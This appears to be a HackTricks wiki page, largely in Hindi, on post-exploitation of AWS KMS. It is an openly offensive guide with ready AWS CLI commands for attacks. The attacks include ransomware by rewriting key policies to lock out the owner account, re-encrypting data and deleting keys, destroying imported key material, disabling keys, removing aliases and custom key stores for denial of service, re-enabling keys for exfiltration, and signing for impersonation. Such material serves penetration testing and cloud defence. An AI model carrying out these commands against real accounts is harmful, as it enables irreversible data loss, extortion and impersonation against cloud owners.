# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### एन्क्रिप्ट/डिक्रिप्ट जानकारी

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` फ़ाइल को बाइनरी मोड में पढ़ता है, सामान्यतः नॉन-टेक्स्ट फाइल्स के लिए उपयोग होता है।
- `file://:` फ़ाइल को टेक्स्ट मोड में पढ़ता है, आमतौर पर प्लेन टेक्स्ट फाइल्स, स्क्रिप्ट्स, या ऐसे JSON के लिए उपयोग होता है जिनमें विशेष एन्कोडिंग आवश्यकताएँ नहीं होतीं।

> [!TIP]
> नोट: यदि आप किसी फाइल के अंदर कुछ डेटा डिक्रिप्ट करना चाहते हैं, तो फाइल में बाइनरी डेटा होना चाहिए, base64 एन्कोडेड डेटा नहीं। (fileb://)

- Using a **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- **asymmetric** key का उपयोग:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

KMS पर विशेषाधिकारिक पहुंच रखने वाला attacker कुंजियों की KMS policy को संशोधित कर सकता है और **अपने खाते को उन पर पहुँच दे सकता है**, वैध खाते को दी गई पहुँच हटा सकता है।

इसके बाद, वैध खाते के उपयोगकर्ता उन कुंजियों से एन्क्रिप्ट की गई किसी भी सेवा की जानकारी तक पहुँच नहीं पाएंगे, जिससे खाते पर एक आसान लेकिन प्रभावी ransomware बन जाएगा।

> [!WARNING]
> ध्यान दें कि **AWS managed keys aren't affected** — प्रभावित केवल **Customer managed keys** हैं।

> साथ ही यह ध्यान दें कि पैरामीटर **`--bypass-policy-lockout-safety-check`** का उपयोग आवश्यक है (web console में इस विकल्प की कमी इस हमले को केवल CLI से संभव बनाती है)।
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> ध्यान दें कि यदि आप उस नीति को बदलते हैं और केवल किसी बाहरी खाते (external account) को ही पहुंच देते हैं, और फिर उसी बाहरी खाते से आप एक नई नीति सेट करके मूल खाते (original account) को पहुंच वापस देने की कोशिश करते हैं, तो आप सक्षम नहीं होंगे क्योंकि Put Polocy क्रिया cross account से निष्पादित नहीं की जा सकती।

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

There is another way to perform a global KMS Ransomware, which would involve the following steps:

- हमलावर द्वारा import किए गए **key with a key material** के साथ एक नया key बनाना
- victim के पुराने डेटा को, जो previous version से encrypt था, नई key से **Re-encrypt older data** करना।
- **Delete the KMS key**
- अब केवल हमलावर, जिसके पास मूल key material है, encrypted डेटा को decrypt करने में सक्षम होगा।

### Delete Keys via kms:DeleteImportedKeyMaterial

With the `kms:DeleteImportedKeyMaterial` permission, an actor can delete the imported key material from CMKs with `Origin=EXTERNAL` (CMKs that have imperted their key material), making them unable to decrypt data. This action is destructive and irreversible unless compatible material is re-imported, allowing an attacker to effectively cause ransomware-like data loss by rendering encrypted information permanently inaccessible.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### keys को नष्ट करना

keys को नष्ट करने से DoS किया जा सकता है।
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> ध्यान दें कि AWS अब **पिछली क्रियाओं को cross account से निष्पादित होने से रोकता है:**

### Alias बदलना या हटाना
यह attack AWS KMS aliases को delete या redirect कर देता है, जिससे key resolution टूट जाती है और उन सेवाओं में तुरंत विफलताएँ होती हैं जो उन aliases पर निर्भर करती हैं, और इसका परिणाम denial-of-service होता है। `kms:DeleteAlias` या `kms:UpdateAlias` जैसे permissions के साथ एक attacker aliases को हटाकर या पुनर्निर्देशित करके cryptographic operations (e.g., encrypt, describe) में बाधा डाल सकता है। कोई भी service जो key ID के बजाय alias को reference करती है वह alias को restore या सही तरीके से remap किए जाने तक fail हो सकती है।
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Cancel Key Deletion
यदि किसी खाते के पास `kms:CancelKeyDeletion` और `kms:EnableKey` जैसी permissions हों, तो एक हमलावर AWS KMS customer master key की अनुसूचित deletion को रद्द कर सकता है और बाद में उसे पुनः सक्षम कर सकता है। ऐसा करने पर कुंजी पुनर्प्राप्त हो जाती है (प्रारंभ में Disabled state में) और पहले से संरक्षित डेटा को decrypt करने की इसकी क्षमता बहाल हो जाती है, जिससे exfiltration संभव हो जाता है।
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### कुंजी अक्षम करें
`kms:DisableKey` अनुमति के साथ, कोई actor एक AWS KMS ग्राहक मास्टर कुंजी को अक्षम कर सकता है, जिससे वह कुंजी एन्क्रिप्शन या डिक्रिप्शन के लिए उपयोग नहीं हो पाएगी। यह उस CMK पर निर्भर किसी भी सेवा के लिए एक्सेस तोड़ देता है और कुंजी के पुनः सक्षम होने तक तात्कालिक व्यवधान या denial-of-service पैदा कर सकता है।
```bash
aws kms disable-key \
--key-id <key_id>
```
### साझा रहस्य व्युत्पन्न करें
यदि किसी के पास `kms:DeriveSharedSecret` permission है, तो एक actor KMS-held निजी कुंजी और उपयोगकर्ता-प्रदान की गई सार्वजनिक कुंजी का उपयोग करके ECDH साझा रहस्य की गणना कर सकता है।
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
`kms:Sign` अनुमति के साथ, कोई actor KMS-में संग्रहीत CMK का उपयोग करके private key को उजागर किए बिना डेटा पर क्रिप्टोग्राफिक रूप से साइन कर सकता है, जिससे वैध signatures बनते हैं जो impersonation को सक्षम कर सकते हैं या दुर्भावनापूर्ण कार्यों को अधिकृत कर सकते हैं।
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS के साथ Custom Key Stores
`kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, या `kms:UpdateCustomKeyStore` जैसी अनुमतियों के साथ, एक actor एक AWS KMS Custom Key Store (CKS) को संशोधित, disconnect, या delete कर सकता है, जिससे उसके master keys inoperable हो जाते हैं। यह उन keys पर निर्भर किसी भी सेवाओं के लिए encryption, decryption, और signing ऑपरेशनों को बाधित कर देता है और तुरंत denial-of-service का कारण बन सकता है। इसलिए उन अनुमतियों को सीमित करना और मॉनिटर करना अत्यंत महत्वपूर्ण है।
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
